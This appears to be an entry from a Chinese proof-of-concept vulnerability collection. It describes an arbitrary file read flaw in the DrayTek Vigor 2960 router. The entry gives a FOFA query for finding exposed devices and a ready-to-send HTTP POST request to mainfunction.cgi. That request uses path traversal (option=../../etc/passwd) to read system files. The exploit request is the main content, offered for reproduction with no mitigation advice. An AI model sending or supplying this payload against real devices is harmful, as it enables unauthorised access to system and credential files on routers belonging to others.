# Draytek Vigor 2960 路由器mainfunction任意文件读取漏洞

# 一、漏洞简介
DrayTek是中国台湾的一家网络设备制造商，其产品包括VPN路由器、管理型交换机、无线AP和管理系统等，并被中小型企业广泛使用。Vigor2960 v1.5.1.4 存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。

# 二、影响版本
+ Draytek Vigor 2960 路由器

# 三、资产测绘
+ fofa`title="Vigor 2960"`
+ 特征


# 四、漏洞复现
```plain
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 
Connection: close
Content-Length: 94
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

action=getSyslogFile&option=../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hg8ng5hsagblmd2p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
